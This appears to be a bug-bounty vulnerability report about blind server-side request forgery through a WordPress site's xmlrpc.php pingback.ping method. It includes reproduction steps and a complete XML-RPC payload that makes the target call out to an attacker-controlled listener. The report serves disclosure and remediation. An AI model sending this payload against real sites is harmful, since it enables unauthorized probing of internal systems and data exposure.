  "vulnerability_information": "**Description:**\n\nHi team,\n\nI would like to report a security vulnerability I discovered on your website. I was able to perform Server-Side Request Forgery (SSRF) attacks via the xmlrpc.php file at https://████████ endpoint.\nUsing a simple POST request to the xmlrpc.php endpoint, I was able to bypass input validation and send a request to an external URL.\n\nI have attached a proof of concept (PoC) script that demonstrates this vulnerability. It sends a request to my VPS server using interact.sh client (https://github.com/projectdiscovery/interactsh), but an attacker could use this technique to send requests to any URL of their choosing.\n\n## References\n\nhttps://www.sonarsource.com/blog/wordpress-core-unauthenticated-blind-ssrf/\nhttps://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/\n\n## Impact\n\nThe vulnerability could be used to conduct further attacks, such as accessing internal systems or exfiltrating sensitive data.\n\n## System Host(s)\n███████\n\n## Affected Product(s) and Version(s)\n\n\n## CVE Numbers\n\n\n## Steps to Reproduce\n1. Start a server in vps using interact.sh or use burpsuite collaborator.\n2. Go to: https://███/xmlrpc.php\n3. See the response:\n```\nXML-RPC server accepts POST requests only.\n```\n4. Go to burpsuite and send this request to the repeater.\n5. Change the request method to POST.\n6. Get the URL of your server listener and set this payload at request:\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodCall>\n<methodName>pingback.ping</methodName>\n<params>\n<param>\n<value><string>https://your server</string></value>\n</param>\n<param>\n<value><string>https://█████/</string></value>\n</param>\n</params>\n</methodCall>\n```\n7. Send the POST request.\n8. See the response in your server log.\n\n## Suggested Mitigation/Remediation Actions\nI would recommend implementing input validation and filtering to prevent these types of attacks in the future. Please let me know if you require any additional information or if you have any questions.\n\n",
